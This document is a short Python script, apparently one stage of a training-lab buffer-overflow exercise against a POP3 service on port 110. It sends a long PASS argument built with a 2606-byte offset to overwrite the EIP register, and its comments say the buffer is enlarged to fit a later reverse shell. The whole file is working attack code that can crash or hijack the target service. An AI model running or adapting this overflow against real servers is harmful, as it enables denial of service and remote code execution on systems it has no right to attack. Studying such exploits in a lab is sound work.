# PART 3.2: Controlling the EIP register
#
# This part is to ensure that the offset determined at 2606 is correct.
# If the offset is correct, EIP should be filled with the 'B' character.
#
# We also need to increase the buffer size to 3500 bytes, as a 90 byte payload is not enough for a reverse shell.
# NOTE: 90 = 2700-2606-4

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

string = "A"*2606 + "B"*4 + "C"*(3500-2606-4)

try:
	print("Sending evil buffer...")
	connect = s.connect(('10.11.22.75', 110))
	data = s.recv(1024)
	s.send("USER username" + "\r\n")
	data = s.recv(1024)
	s.send("PASS {}".format(string) + "\r\n")
	s.close()
	print("\nDone")
except Exception as e:
	print(e)

